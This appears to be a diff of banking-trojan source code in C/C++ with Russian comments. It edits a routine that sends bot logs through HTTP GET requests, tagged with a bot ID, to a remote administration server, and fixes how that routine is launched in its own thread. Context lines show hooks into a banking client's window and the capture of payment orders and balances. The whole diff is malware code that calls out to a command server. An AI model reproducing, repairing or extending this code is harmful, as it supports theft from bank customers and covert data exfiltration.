@@ -215,7 +215,7 @@ static void SendLogToAdmin( int num, const char* text = 0 )
 	}
 	else
 		empty[0] = 0, paramText = valText = empty;
-	int sz = pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=rafa&mode=setlog&log=%d%s%s", domain, BOT_UID, num, paramText, valText );
+	int sz = pwsprintfA( qr, "http://%s/raf/?uid=%s&sys=raifur&mode=setlog&log=%d%s%s", domain, BOT_UID, num, paramText, valText );
 	if( valText != empty ) STR::Free(valText);
 	THTTPResponseRec Response;
 	ClearStruct(Response);
@@ -231,7 +231,7 @@ struct LogInfo
 };
 
 // Функция отправляет лог в отдельном потоке
-static DWORD WINAPI SendLogToAdminThread( LPVOID p )
+static DWORD WINAPI SendLogToAdminThread2( LPVOID p )
 {
 	LogInfo* p2 = (LogInfo*)p;
 	SendLogToAdmin( p2->num, p2->text );
@@ -254,7 +254,7 @@ static DWORD WINAPI SendLogToAdminThread( int num, const char* text = 0 )
 		}
 		else
 			p->text[0] = 0;
-		StartThread( SendLogToAdmin, p );
+		StartThread( SendLogToAdminThread2, p );
 	}
 	return 0;
 }
@@ -1831,7 +1831,6 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 			}
 			if( !hookDll ) break;
 			InitData();
-			//SendLogToAdmin( 0, "тестовая строка" );
 			//ждем пока появится основное окно в котором должны быть контролы TreeView и ListView
 			for( int i = 0; i < 300; i++ )
 			{
@@ -2150,7 +2149,7 @@ static void SavePaymentOrders()
 }
 
 //отсылка Get запроса админке, если ret = true, то нужно возвращать ответ
-//mode1 - текст команды для обного баланса, mode2 - текст команды для нескольких балансов
+//mode1 - текст команды для одного баланса, mode2 - текст команды для нескольких балансов
 static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 {
 	char urlAdmin[128];
